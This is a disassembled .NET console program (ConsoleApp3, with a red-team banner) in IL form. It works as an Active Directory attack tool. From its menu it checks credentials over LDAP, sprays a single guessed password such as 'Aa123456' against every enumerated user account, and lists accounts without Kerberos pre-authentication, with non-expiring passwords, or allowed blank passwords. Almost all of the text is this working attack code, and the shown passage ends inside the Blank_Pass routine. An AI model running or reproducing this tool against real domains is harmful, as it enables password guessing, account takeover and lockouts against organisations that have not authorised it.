
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.5.30319.0



// Metadata version: v4.0.30319
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System.DirectoryServices
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 4:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly ConsoleApp3
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 07 01 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 0B 43 6F 6E 73 6F 6C 65 41 70 70 33 00 00 ) // ...ConsoleApp3..
  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyConfigurationAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 0B 43 6F 6E 73 6F 6C 65 41 70 70 33 00 00 ) // ...ConsoleApp3..
  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 12 43 6F 70 79 72 69 67 68 74 20 C2 A9 20   // ...Copyright .. 
                                                                                                  20 32 30 32 31 00 00 )                            //  2021..
  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 37 35 37 37 38 30 33 31 2D 32 65 33 66   // ..$75778031-2e3f
                                                                                                  2D 34 65 31 63 2D 39 63 36 31 2D 31 63 30 64 33   // -4e1c-9c61-1c0d3
                                                                                                  37 34 33 33 38 32 62 00 00 )                      // 743382b..
  .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 31 2E 30 2E 30 2E 30 00 00 )             // ...1.0.0.0..
  .custom instance void [mscorlib]System.Runtime.Versioning.TargetFrameworkAttribute::.ctor(string) = ( 01 00 1C 2E 4E 45 54 46 72 61 6D 65 77 6F 72 6B   // ....NETFramework
                                                                                                        2C 56 65 72 73 69 6F 6E 3D 76 34 2E 37 2E 32 01   // ,Version=v4.7.2.
                                                                                                        00 54 0E 14 46 72 61 6D 65 77 6F 72 6B 44 69 73   // .T..FrameworkDis
                                                                                                        70 6C 61 79 4E 61 6D 65 14 2E 4E 45 54 20 46 72   // playName..NET Fr
                                                                                                        61 6D 65 77 6F 72 6B 20 34 2E 37 2E 32 )          // amework 4.7.2
  .hash algorithm 0x00008004
  .ver 1:0:0:0
}
.module ConsoleApp3.exe
// MVID: {0B490A22-0082-45B6-9E35-36B8F5983275}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0003       // WINDOWS_CUI
.corflags 0x00020003    //  ILONLY 32BITPREFERRED
// Image base: 0x03630000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi beforefieldinit ConsoleApp3.Program
       extends [mscorlib]System.Object
{
  .method private hidebysig static void  Main(string[] args) cil managed
  {
    .entrypoint
    // Code size       233 (0xe9)
    .maxstack  5
    .locals init (int32 V_0,
             string V_1,
             string V_2,
             string[] V_3,
             string V_4,
             int32 V_5,
             int32 V_6)
    IL_0000:  nop
    IL_0001:  ldc.i4.s   12
    IL_0003:  call       void [mscorlib]System.Console::set_ForegroundColor(valuetype [mscorlib]System.ConsoleColor)
    IL_0008:  nop
    IL_0009:  ldstr      " _______                 __    _________          "
    + "                   ____      ____  __       \r\n|_   __ \\               |"
    + "  ]  |  _   _  |                           |_  _|    |_  _|[  |      \r\n"
    + "  | |__) |  .---.   .--.| |   |_/ | | \\_|.---.  ,--.   _ .--..--.     "
    + "\\ \\  /\\  / /   | |--.   \r\n  |  __ /  / /__\\\\/ /'`\\' |       | |   / /__"
    + "\\\\`'_\\ : [ `.-. .-. |     \\ \\/  \\/ /    | .-. |  \r\n _| |  \\ \\_| \\__.,| "
    + "\\__/  |      _| |_  | \\__.,// | |, | | | | | |      \\  /\\  /     | | | "
    + "|  \r\n|____| |___|'.__.' '.__.;__]    |_____|  '.__.'\\'-;__/[___||__||__"
    + "]      \\/  \\/     [___]|__] "
    IL_000e:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0013:  nop
    IL_0014:  ldc.i4.s   10
    IL_0016:  call       void [mscorlib]System.Console::set_ForegroundColor(valuetype [mscorlib]System.ConsoleColor)
    IL_001b:  nop
    IL_001c:  ldstr      "\nPlease Choose The Relevant Options:\n1 (Get-Full-L"
    + "dap-DomainName)\n2 (Check-Single-Authenticate)\n3 (Password - Spray)\n4 (N"
    + "o-Kerb-Required)\n5 (Dont-Expire-Pass)\n6 (Blank-Pass)\n7\n8 Exit\n"
    IL_0021:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0026:  nop
    IL_0027:  call       string [mscorlib]System.Console::ReadLine()
    IL_002c:  call       int32 [mscorlib]System.Convert::ToInt32(string)
    IL_0031:  stloc.0
    IL_0032:  nop
    IL_0033:  ldloc.0
    IL_0034:  stloc.s    V_6
    IL_0036:  ldloc.s    V_6
    IL_0038:  stloc.s    V_5
    IL_003a:  ldloc.s    V_5
    IL_003c:  ldc.i4.1
    IL_003d:  sub
    IL_003e:  switch     ( 
                          IL_0064,
                          IL_0071,
                          IL_00b1,
                          IL_00cd,
                          IL_00d5,
                          IL_00dd,
                          IL_00e5)
    IL_005f:  br         IL_00e7

    IL_0064:  call       string ConsoleApp3.Program::GetDomain()
    IL_0069:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_006e:  nop
    IL_006f:  br.s       IL_00e7

    IL_0071:  ldstr      "\nPlease Provide Username and password in this fora"
    + "mt username:password:"
    IL_0076:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_007b:  nop
    IL_007c:  call       string [mscorlib]System.Console::ReadLine()
    IL_0081:  stloc.1
    IL_0082:  ldstr      ""
    IL_0087:  stloc.2
    IL_0088:  ldloc.1
    IL_0089:  ldc.i4.1
    IL_008a:  newarr     [mscorlib]System.Char
    IL_008f:  dup
    IL_0090:  ldc.i4.0
    IL_0091:  ldc.i4.s   58
    IL_0093:  stelem.i2
    IL_0094:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
    IL_0099:  stloc.3
    IL_009a:  ldloc.3
    IL_009b:  ldc.i4.0
    IL_009c:  ldelem.ref
    IL_009d:  stloc.1
    IL_009e:  ldloc.3
    IL_009f:  ldc.i4.1
    IL_00a0:  ldelem.ref
    IL_00a1:  stloc.2
    IL_00a2:  ldloc.1
    IL_00a3:  ldloc.2
    IL_00a4:  call       string ConsoleApp3.Program::GetDomain()
    IL_00a9:  call       void ConsoleApp3.Program::Authenticate(string,
                                                                string,
                                                                string)
    IL_00ae:  nop
    IL_00af:  br.s       IL_00e7

    IL_00b1:  ldstr      "\nPlease Provide Password To Guess: Aa123456 \? lol \n"
    IL_00b6:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_00bb:  nop
    IL_00bc:  call       string [mscorlib]System.Console::ReadLine()
    IL_00c1:  stloc.s    V_4
    IL_00c3:  ldloc.s    V_4
    IL_00c5:  call       void ConsoleApp3.Program::PassSpray(string)
    IL_00ca:  nop
    IL_00cb:  br.s       IL_00e7

    IL_00cd:  call       void ConsoleApp3.Program::NokerbAuth()
    IL_00d2:  nop
    IL_00d3:  br.s       IL_00e7

    IL_00d5:  call       void ConsoleApp3.Program::Dont_Expire_Pass()
    IL_00da:  nop
    IL_00db:  br.s       IL_00e7

    IL_00dd:  call       void ConsoleApp3.Program::Blank_Pass()
    IL_00e2:  nop
    IL_00e3:  br.s       IL_00e7

    IL_00e5:  br.s       IL_00e7

    IL_00e7:  nop
    IL_00e8:  ret
  } // end of method Program::Main

  .method public hidebysig static string 
          GetDomain() cil managed
  {
    // Code size       18 (0x12)
    .maxstack  1
    .locals init (string V_0,
             string V_1)
    IL_0000:  nop
    IL_0001:  call       class [System]System.Net.NetworkInformation.IPGlobalProperties [System]System.Net.NetworkInformation.IPGlobalProperties::GetIPGlobalProperties()
    IL_0006:  callvirt   instance string [System]System.Net.NetworkInformation.IPGlobalProperties::get_DomainName()
    IL_000b:  stloc.0
    IL_000c:  ldloc.0
    IL_000d:  stloc.1
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.1
    IL_0011:  ret
  } // end of method Program::GetDomain

  .method public hidebysig static void  Authenticate(string userName,
                                                     string password,
                                                     string domain) cil managed
  {
    // Code size       170 (0xaa)
    .maxstack  4
    .locals init (bool V_0,
             class [System.DirectoryServices]System.DirectoryServices.DirectoryEntry V_1,
             object V_2,
             bool V_3)
    IL_0000:  nop
    IL_0001:  ldc.i4.0
    IL_0002:  stloc.0
    .try
    {
      IL_0003:  nop
      IL_0004:  ldstr      "LDAP://"
      IL_0009:  ldarg.2
      IL_000a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_000f:  ldarg.0
      IL_0010:  ldarg.1
      IL_0011:  newobj     instance void [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::.ctor(string,
                                                                                                                  string,
                                                                                                                  string)
      IL_0016:  stloc.1
      IL_0017:  ldloc.1
      IL_0018:  callvirt   instance object [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::get_NativeObject()
      IL_001d:  stloc.2
      IL_001e:  ldc.i4.1
      IL_001f:  stloc.0
      IL_0020:  nop
      IL_0021:  leave.s    IL_0028

    }  // end .try
    catch [System.DirectoryServices]System.DirectoryServices.DirectoryServicesCOMException 
    {
      IL_0023:  pop
      IL_0024:  nop
      IL_0025:  nop
      IL_0026:  leave.s    IL_0028

    }  // end handler
    IL_0028:  ldloc.0
    IL_0029:  stloc.3
    IL_002a:  ldloc.3
    IL_002b:  brfalse.s  IL_006c

    IL_002d:  nop
    IL_002e:  ldc.i4.s   10
    IL_0030:  call       void [mscorlib]System.Console::set_ForegroundColor(valuetype [mscorlib]System.ConsoleColor)
    IL_0035:  nop
    IL_0036:  ldc.i4.5
    IL_0037:  newarr     [mscorlib]System.String
    IL_003c:  dup
    IL_003d:  ldc.i4.0
    IL_003e:  ldarg.0
    IL_003f:  stelem.ref
    IL_0040:  dup
    IL_0041:  ldc.i4.1
    IL_0042:  ldstr      ":"
    IL_0047:  stelem.ref
    IL_0048:  dup
    IL_0049:  ldc.i4.2
    IL_004a:  ldarg.1
    IL_004b:  stelem.ref
    IL_004c:  dup
    IL_004d:  ldc.i4.3
    IL_004e:  ldstr      "-"
    IL_0053:  stelem.ref
    IL_0054:  dup
    IL_0055:  ldc.i4.4
    IL_0056:  ldloca.s   V_0
    IL_0058:  call       instance string [mscorlib]System.Boolean::ToString()
    IL_005d:  stelem.ref
    IL_005e:  call       string [mscorlib]System.String::Concat(string[])
    IL_0063:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0068:  nop
    IL_0069:  nop
    IL_006a:  br.s       IL_00a9

    IL_006c:  nop
    IL_006d:  ldc.i4.s   12
    IL_006f:  call       void [mscorlib]System.Console::set_ForegroundColor(valuetype [mscorlib]System.ConsoleColor)
    IL_0074:  nop
    IL_0075:  ldc.i4.5
    IL_0076:  newarr     [mscorlib]System.String
    IL_007b:  dup
    IL_007c:  ldc.i4.0
    IL_007d:  ldarg.0
    IL_007e:  stelem.ref
    IL_007f:  dup
    IL_0080:  ldc.i4.1
    IL_0081:  ldstr      ":"
    IL_0086:  stelem.ref
    IL_0087:  dup
    IL_0088:  ldc.i4.2
    IL_0089:  ldarg.1
    IL_008a:  stelem.ref
    IL_008b:  dup
    IL_008c:  ldc.i4.3
    IL_008d:  ldstr      "-"
    IL_0092:  stelem.ref
    IL_0093:  dup
    IL_0094:  ldc.i4.4
    IL_0095:  ldloca.s   V_0
    IL_0097:  call       instance string [mscorlib]System.Boolean::ToString()
    IL_009c:  stelem.ref
    IL_009d:  call       string [mscorlib]System.String::Concat(string[])
    IL_00a2:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_00a7:  nop
    IL_00a8:  nop
    IL_00a9:  ret
  } // end of method Program::Authenticate

  .method public hidebysig static void  PassSpray(string pass) cil managed
  {
    // Code size       307 (0x133)
    .maxstack  3
    .locals init (int32 V_0,
             class [mscorlib]System.Collections.Generic.List`1<string> V_1,
             string V_2,
             class [System.DirectoryServices]System.DirectoryServices.DirectoryEntry V_3,
             class [System.DirectoryServices]System.DirectoryServices.DirectorySearcher V_4,
             class [System.DirectoryServices]System.DirectoryServices.SearchResult V_5,
             class [System.DirectoryServices]System.DirectoryServices.SearchResultCollection V_6,
             bool V_7,
             int32 V_8,
             bool V_9,
             bool V_10,
             int32 V_11,
             int32 V_12,
             bool V_13)
    IL_0000:  nop
    IL_0001:  ldc.i4.0
    IL_0002:  stloc.0
    IL_0003:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<string>::.ctor()
    IL_0008:  stloc.1
    IL_0009:  ldstr      "LDAP://"
    IL_000e:  call       string ConsoleApp3.Program::GetDomain()
    IL_0013:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0018:  stloc.2
    IL_0019:  ldloc.2
    IL_001a:  newobj     instance void [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::.ctor(string)
    IL_001f:  stloc.3
    IL_0020:  ldloc.3
    IL_0021:  newobj     instance void [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::.ctor(class [System.DirectoryServices]System.DirectoryServices.DirectoryEntry)
    IL_0026:  stloc.s    V_4
    IL_0028:  ldloc.s    V_4
    IL_002a:  ldstr      "sAMAccountType=805306368"
    IL_002f:  callvirt   instance void [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::set_Filter(string)
    IL_0034:  nop
    IL_0035:  ldloc.s    V_4
    IL_0037:  callvirt   instance class [System]System.Collections.Specialized.StringCollection [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::get_PropertiesToLoad()
    IL_003c:  ldstr      "samaccountname"
    IL_0041:  callvirt   instance int32 [System]System.Collections.Specialized.StringCollection::Add(string)
    IL_0046:  pop
    IL_0047:  ldloc.s    V_4
    IL_0049:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.SearchResultCollection [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::FindAll()
    IL_004e:  stloc.s    V_6
    IL_0050:  ldloc.s    V_6
    IL_0052:  ldnull
    IL_0053:  cgt.un
    IL_0055:  stloc.s    V_7
    IL_0057:  ldloc.s    V_7
    IL_0059:  brfalse    IL_00ff

    IL_005e:  nop
    IL_005f:  ldc.i4.0
    IL_0060:  stloc.s    V_8
    IL_0062:  br.s       IL_00b3

    IL_0064:  nop
    IL_0065:  ldloc.s    V_6
    IL_0067:  ldloc.s    V_8
    IL_0069:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.SearchResult [System.DirectoryServices]System.DirectoryServices.SearchResultCollection::get_Item(int32)
    IL_006e:  stloc.s    V_5
    IL_0070:  ldloc.s    V_5
    IL_0072:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.ResultPropertyCollection [System.DirectoryServices]System.DirectoryServices.SearchResult::get_Properties()
    IL_0077:  ldstr      "samaccountname"
    IL_007c:  callvirt   instance bool [System.DirectoryServices]System.DirectoryServices.ResultPropertyCollection::Contains(string)
    IL_0081:  stloc.s    V_9
    IL_0083:  ldloc.s    V_9
    IL_0085:  brfalse.s  IL_00ac

    IL_0087:  nop
    IL_0088:  ldloc.1
    IL_0089:  ldloc.s    V_5
    IL_008b:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.ResultPropertyCollection [System.DirectoryServices]System.DirectoryServices.SearchResult::get_Properties()
    IL_0090:  ldstr      "samaccountname"
    IL_0095:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.ResultPropertyValueCollection [System.DirectoryServices]System.DirectoryServices.ResultPropertyCollection::get_Item(string)
    IL_009a:  ldc.i4.0
    IL_009b:  callvirt   instance object [System.DirectoryServices]System.DirectoryServices.ResultPropertyValueCollection::get_Item(int32)
    IL_00a0:  castclass  [mscorlib]System.String
    IL_00a5:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
    IL_00aa:  nop
    IL_00ab:  nop
    IL_00ac:  nop
    IL_00ad:  ldloc.s    V_8
    IL_00af:  ldc.i4.1
    IL_00b0:  add
    IL_00b1:  stloc.s    V_8
    IL_00b3:  ldloc.s    V_8
    IL_00b5:  ldloc.s    V_6
    IL_00b7:  callvirt   instance int32 [System.DirectoryServices]System.DirectoryServices.SearchResultCollection::get_Count()
    IL_00bc:  clt
    IL_00be:  stloc.s    V_10
    IL_00c0:  ldloc.s    V_10
    IL_00c2:  brtrue.s   IL_0064

    IL_00c4:  ldstr      "there is: "
    IL_00c9:  ldloc.1
    IL_00ca:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<string>::get_Count()
    IL_00cf:  stloc.s    V_11
    IL_00d1:  ldloca.s   V_11
    IL_00d3:  call       instance string [mscorlib]System.Int32::ToString()
    IL_00d8:  ldstr      " Users\n"
    IL_00dd:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_00e2:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_00e7:  nop
    IL_00e8:  ldstr      "Starting Pass-Spray with :"
    IL_00ed:  ldarg.0
    IL_00ee:  ldstr      "\n"
    IL_00f3:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_00f8:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_00fd:  nop
    IL_00fe:  nop
    IL_00ff:  ldloc.1
    IL_0100:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<string>::get_Count()
    IL_0105:  stloc.0
    IL_0106:  ldc.i4.0
    IL_0107:  stloc.s    V_12
    IL_0109:  br.s       IL_0127

    IL_010b:  nop
    IL_010c:  ldloc.1
    IL_010d:  ldloc.s    V_12
    IL_010f:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<string>::get_Item(int32)
    IL_0114:  ldarg.0
    IL_0115:  call       string ConsoleApp3.Program::GetDomain()
    IL_011a:  call       void ConsoleApp3.Program::Authenticate(string,
                                                                string,
                                                                string)
    IL_011f:  nop
    IL_0120:  nop
    IL_0121:  ldloc.s    V_12
    IL_0123:  ldc.i4.1
    IL_0124:  add
    IL_0125:  stloc.s    V_12
    IL_0127:  ldloc.s    V_12
    IL_0129:  ldloc.0
    IL_012a:  clt
    IL_012c:  stloc.s    V_13
    IL_012e:  ldloc.s    V_13
    IL_0130:  brtrue.s   IL_010b

    IL_0132:  ret
  } // end of method Program::PassSpray

  .method public hidebysig static void  NokerbAuth() cil managed
  {
    // Code size       162 (0xa2)
    .maxstack  2
    .locals init (string V_0,
             class [System.DirectoryServices]System.DirectoryServices.DirectoryEntry V_1,
             class [System.DirectoryServices]System.DirectoryServices.DirectorySearcher V_2,
             class [System.DirectoryServices]System.DirectoryServices.SearchResult V_3,
             class [System.DirectoryServices]System.DirectoryServices.SearchResultCollection V_4,
             bool V_5,
             int32 V_6,
             bool V_7,
             bool V_8)
    IL_0000:  nop
    IL_0001:  ldstr      "LDAP://"
    IL_0006:  call       string ConsoleApp3.Program::GetDomain()
    IL_000b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0010:  stloc.0
    IL_0011:  ldloc.0
    IL_0012:  newobj     instance void [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::.ctor(string)
    IL_0017:  stloc.1
    IL_0018:  ldloc.1
    IL_0019:  newobj     instance void [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::.ctor(class [System.DirectoryServices]System.DirectoryServices.DirectoryEntry)
    IL_001e:  stloc.2
    IL_001f:  ldloc.2
    IL_0020:  ldstr      "(&(samAccountType=805306368)(userAccountControl:1."
    + "2.840.113556.1.4.803:=4194304))"
    IL_0025:  callvirt   instance void [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::set_Filter(string)
    IL_002a:  nop
    IL_002b:  ldloc.2
    IL_002c:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.SearchResultCollection [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::FindAll()
    IL_0031:  stloc.s    V_4
    IL_0033:  ldloc.s    V_4
    IL_0035:  ldnull
    IL_0036:  cgt.un
    IL_0038:  stloc.s    V_5
    IL_003a:  ldloc.s    V_5
    IL_003c:  brfalse.s  IL_00a1

    IL_003e:  nop
    IL_003f:  ldc.i4.0
    IL_0040:  stloc.s    V_6
    IL_0042:  br.s       IL_008f

    IL_0044:  nop
    IL_0045:  ldloc.s    V_4
    IL_0047:  ldloc.s    V_6
    IL_0049:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.SearchResult [System.DirectoryServices]System.DirectoryServices.SearchResultCollection::get_Item(int32)
    IL_004e:  stloc.3
    IL_004f:  ldloc.3
    IL_0050:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.ResultPropertyCollection [System.DirectoryServices]System.DirectoryServices.SearchResult::get_Properties()
    IL_0055:  ldstr      "samaccountname"
    IL_005a:  callvirt   instance bool [System.DirectoryServices]System.DirectoryServices.ResultPropertyCollection::Contains(string)
    IL_005f:  stloc.s    V_7
    IL_0061:  ldloc.s    V_7
    IL_0063:  brfalse.s  IL_0088

    IL_0065:  nop
    IL_0066:  ldloc.3
    IL_0067:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.ResultPropertyCollection [System.DirectoryServices]System.DirectoryServices.SearchResult::get_Properties()
    IL_006c:  ldstr      "samaccountname"
    IL_0071:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.ResultPropertyValueCollection [System.DirectoryServices]System.DirectoryServices.ResultPropertyCollection::get_Item(string)
    IL_0076:  ldc.i4.0
    IL_0077:  callvirt   instance object [System.DirectoryServices]System.DirectoryServices.ResultPropertyValueCollection::get_Item(int32)
    IL_007c:  castclass  [mscorlib]System.String
    IL_0081:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0086:  nop
    IL_0087:  nop
    IL_0088:  nop
    IL_0089:  ldloc.s    V_6
    IL_008b:  ldc.i4.1
    IL_008c:  add
    IL_008d:  stloc.s    V_6
    IL_008f:  ldloc.s    V_6
    IL_0091:  ldloc.s    V_4
    IL_0093:  callvirt   instance int32 [System.DirectoryServices]System.DirectoryServices.SearchResultCollection::get_Count()
    IL_0098:  clt
    IL_009a:  stloc.s    V_8
    IL_009c:  ldloc.s    V_8
    IL_009e:  brtrue.s   IL_0044

    IL_00a0:  nop
    IL_00a1:  ret
  } // end of method Program::NokerbAuth

  .method public hidebysig static void  Dont_Expire_Pass() cil managed
  {
    // Code size       162 (0xa2)
    .maxstack  2
    .locals init (string V_0,
             class [System.DirectoryServices]System.DirectoryServices.DirectoryEntry V_1,
             class [System.DirectoryServices]System.DirectoryServices.DirectorySearcher V_2,
             class [System.DirectoryServices]System.DirectoryServices.SearchResult V_3,
             class [System.DirectoryServices]System.DirectoryServices.SearchResultCollection V_4,
             bool V_5,
             int32 V_6,
             bool V_7,
             bool V_8)
    IL_0000:  nop
    IL_0001:  ldstr      "LDAP://"
    IL_0006:  call       string ConsoleApp3.Program::GetDomain()
    IL_000b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0010:  stloc.0
    IL_0011:  ldloc.0
    IL_0012:  newobj     instance void [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::.ctor(string)
    IL_0017:  stloc.1
    IL_0018:  ldloc.1
    IL_0019:  newobj     instance void [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::.ctor(class [System.DirectoryServices]System.DirectoryServices.DirectoryEntry)
    IL_001e:  stloc.2
    IL_001f:  ldloc.2
    IL_0020:  ldstr      "(&(objectCategory=person)(objectClass=user)(userAc"
    + "countControl:1.2.840.113556.1.4.803:=65536))"
    IL_0025:  callvirt   instance void [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::set_Filter(string)
    IL_002a:  nop
    IL_002b:  ldloc.2
    IL_002c:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.SearchResultCollection [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::FindAll()
    IL_0031:  stloc.s    V_4
    IL_0033:  ldloc.s    V_4
    IL_0035:  ldnull
    IL_0036:  cgt.un
    IL_0038:  stloc.s    V_5
    IL_003a:  ldloc.s    V_5
    IL_003c:  brfalse.s  IL_00a1

    IL_003e:  nop
    IL_003f:  ldc.i4.0
    IL_0040:  stloc.s    V_6
    IL_0042:  br.s       IL_008f

    IL_0044:  nop
    IL_0045:  ldloc.s    V_4
    IL_0047:  ldloc.s    V_6
    IL_0049:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.SearchResult [System.DirectoryServices]System.DirectoryServices.SearchResultCollection::get_Item(int32)
    IL_004e:  stloc.3
    IL_004f:  ldloc.3
    IL_0050:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.ResultPropertyCollection [System.DirectoryServices]System.DirectoryServices.SearchResult::get_Properties()
    IL_0055:  ldstr      "samaccountname"
    IL_005a:  callvirt   instance bool [System.DirectoryServices]System.DirectoryServices.ResultPropertyCollection::Contains(string)
    IL_005f:  stloc.s    V_7
    IL_0061:  ldloc.s    V_7
    IL_0063:  brfalse.s  IL_0088

    IL_0065:  nop
    IL_0066:  ldloc.3
    IL_0067:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.ResultPropertyCollection [System.DirectoryServices]System.DirectoryServices.SearchResult::get_Properties()
    IL_006c:  ldstr      "samaccountname"
    IL_0071:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.ResultPropertyValueCollection [System.DirectoryServices]System.DirectoryServices.ResultPropertyCollection::get_Item(string)
    IL_0076:  ldc.i4.0
    IL_0077:  callvirt   instance object [System.DirectoryServices]System.DirectoryServices.ResultPropertyValueCollection::get_Item(int32)
    IL_007c:  castclass  [mscorlib]System.String
    IL_0081:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0086:  nop
    IL_0087:  nop
    IL_0088:  nop
    IL_0089:  ldloc.s    V_6
    IL_008b:  ldc.i4.1
    IL_008c:  add
    IL_008d:  stloc.s    V_6
    IL_008f:  ldloc.s    V_6
    IL_0091:  ldloc.s    V_4
    IL_0093:  callvirt   instance int32 [System.DirectoryServices]System.DirectoryServices.SearchResultCollection::get_Count()
    IL_0098:  clt
    IL_009a:  stloc.s    V_8
    IL_009c:  ldloc.s    V_8
    IL_009e:  brtrue.s   IL_0044

    IL_00a0:  nop
    IL_00a1:  ret
  } // end of method Program::Dont_Expire_Pass

  .method public hidebysig static void  Blank_Pass() cil managed
  {
    // Code size       162 (0xa2)
    .maxstack  2
    .locals init (string V_0,
             class [System.DirectoryServices]System.DirectoryServices.DirectoryEntry V_1,
             class [System.DirectoryServices]System.DirectoryServices.DirectorySearcher V_2,
             class [System.DirectoryServices]System.DirectoryServices.SearchResult V_3,
             class [System.DirectoryServices]System.DirectoryServices.SearchResultCollection V_4,
             bool V_5,
             int32 V_6,
             bool V_7,
             bool V_8)
    IL_0000:  nop
    IL_0001:  ldstr      "LDAP://"
    IL_0006:  call       string ConsoleApp3.Program::GetDomain()
    IL_000b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0010:  stloc.0
    IL_0011:  ldloc.0
    IL_0012:  newobj     instance void [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::.ctor(string)
    IL_0017:  stloc.1
    IL_0018:  ldloc.1
    IL_0019:  newobj     instance void [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::.ctor(class [System.DirectoryServices]System.DirectoryServices.DirectoryEntry)
    IL_001e:  stloc.2
    IL_001f:  ldloc.2
    IL_0020:  ldstr      "(&(objectCategory=Person)(objectClass=User)(userAc"
    + "countControl:1.2.840.113556.1.4.803:=32))"
    IL_0025:  callvirt   instance void [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::set_Filter(string)
    IL_002a:  nop
    IL_002b:  ldloc.2
    IL_002c:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.SearchResultCollection [System.DirectoryServices]System.DirectoryServices.DirectorySearcher::FindAll()
    IL_0031:  stloc.s    V_4
    IL_0033:  ldloc.s    V_4
    IL_0035:  ldnull
    IL_0036:  cgt.un
    IL_0038:  stloc.s    V_5
    IL_003a:  ldloc.s    V_5
    IL_003c:  brfalse.s  IL_00a1

    IL_003e:  nop
    IL_003f:  ldc.i4.0
    IL_0040:  stloc.s    V_6
    IL_0042:  br.s       IL_008f

    IL_0044:  nop
    IL_0045:  ldloc.s    V_4
    IL_0047:  ldloc.s    V_6
